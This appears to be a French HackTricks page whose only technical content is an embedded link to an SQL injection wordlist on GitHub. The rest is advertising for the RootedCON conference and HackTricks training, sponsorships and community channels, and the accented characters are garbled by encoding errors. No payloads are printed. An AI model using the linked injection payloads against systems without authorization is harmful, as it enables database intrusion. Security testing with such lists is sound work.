{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement le plus pertinent en mati√®re de cybers√©curit√© en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©**? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks**? ou voulez-vous avoir acc√®s √† la **derni√®re version du PEASS ou t√©l√©charger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [d√©p√¥t hacktricks](https://github.com/carlospolop/hacktricks) et [d√©p√¥t hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
